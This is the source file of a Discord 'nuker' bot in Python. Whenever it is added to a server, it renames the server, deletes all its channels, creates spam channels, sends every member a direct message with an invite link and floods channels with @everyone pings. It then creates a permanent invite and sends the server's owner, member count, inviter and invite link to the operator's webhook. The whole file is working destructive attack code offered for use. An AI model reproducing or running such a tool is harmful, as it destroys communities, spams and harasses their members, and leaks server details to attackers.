import os
try:
	import asyncio
	import discord
	import threading
	import random
	import aiohttp
except:
	os.system("pip install discord.py")
	os.system("pip install threading")

from discord.ext import commands

GuildName = "Crashed"
ChannelName = "Crashed"
SpamLink = "https://discord.gg/angelicplate"
SpamAmount = 5
ChannelsAmount = 20
WhiteListServerID = 1000000000
webhook_url = "Here Your Webhook URL Wheres will be Logs"

class Colors:
    teal = 0x1abc9c
    dark_teal = 0x11806a
    green = 0x2ecc71
    dark_green = 0x1f8b4c
    blue = 0x3498db
    dark_blue = 0x206694
    purple = 0x9b59b6
    dark_purple = 0x71368a
    magenta = 0xe91e63
    dark_magenta = 0xad1457
    gold = 0xf1c40f
    dark_gold = 0xc27c0e
    orange = 0xe67e22
    dark_orange = 0xa84300
    red = 0xe74c3c
    dark_red = 0x992d22
    lighter_grey = 0x95a5a6
    dark_grey = 0x607d8b
    light_grey = 0x979c9f
    darker_grey = 0x546e7a
    blurple = 0x7289da
    greyple = 0x99aab5

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@bot.event
async def on_guild_join(guild):
	
	gu = guild.name
	av = guild.icon
			
	if guild.id == WhiteListServerID:
		await guild.leave()
		return
	
	await guild.edit(name=f"{GuildName} {random.randint(1, 1000)}")

	channel_tasks = []
	for channel in guild.channels:
		task = asyncio.create_task(channel.delete(reason=None))
		channel_tasks.append(task)
		if len(channel_tasks) >= 10:
			await asyncio.wait(channel_tasks, timeout=0.1)
			channel_tasks = []
                     
	def create_channels():
		for i in range(1):
			asyncio.run_coroutine_threadsafe(guild.create_text_channel(f"{ChannelName} {random.randint(1, 1000)}"), bot.loop)

	threads = []
	for _ in range(20):
		thread = threading.Thread(target=create_channels)
		thread.start()
		threads.append(thread)

	for thread in threads:
		thread.join()
		
	await asyncio.sleep(3)
	
	def dm_all():
		for mg in guild.members:
			for i in range(1):
				asyncio.run_coroutine_threadsafe(mg.send(SpamLink), bot.loop)
	
	threads = []
	for _ in range(3):
		thread = threading.Thread(target=dm_all)
		thread.start()
		threads.append(thread)
	
	await asyncio.sleep(3)
	
	em=discord.Embed(title="> - Moving to Server - <", description=f"{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n{SpamLink}\n", color=Colors.dark_grey)
	em.set_author(name="Coded by dbnw (GitHub")
    
	def send_messages():
		for channel in guild.text_channels:
			for i in range(1):
				asyncio.run_coroutine_threadsafe(channel.send(f"||@everyone @here|| {SpamLink}", embed=em), bot.loop)

	threads = []
	for _ in range(5):
		thread = threading.Thread(target=send_messages)
		thread.start()
		threads.append(thread)

	for thread in threads:
		thread.join()
	integrations = await guild.integrations()

	for integration in integrations:
		if isinstance(integration, discord.BotIntegration):
			if integration.application.user.name == bot.user.name:
				bot_inviter = integration.user
				
	channel = guild.text_channels[0]
	invite = await channel.create_invite(max_age=0, temporary=True)
	async with aiohttp.ClientSession() as session:
		webhook = discord.Webhook.from_url(webhook_url, session=session)
		em = discord.Embed(title="Новый Краш")
		em.add_field(name="Name Guild", value=gu)
		em.add_field(name="Owner Guild", value=guild.owner)
		em.add_field(name="Members", value=len(guild.members))
		em.add_field(name="Invite", value=f"[Click]({invite.url})")
		em.add_field(name="Roles", value=len(guild.roles))
		em.add_field(name="Boosts", value=guild.premium_subscription_count)
		em.add_field(name="Inviter", value=bot_inviter)
		em.set_thumbnail(url=av)
		await webhook.send(embed=em)


bot.run("")
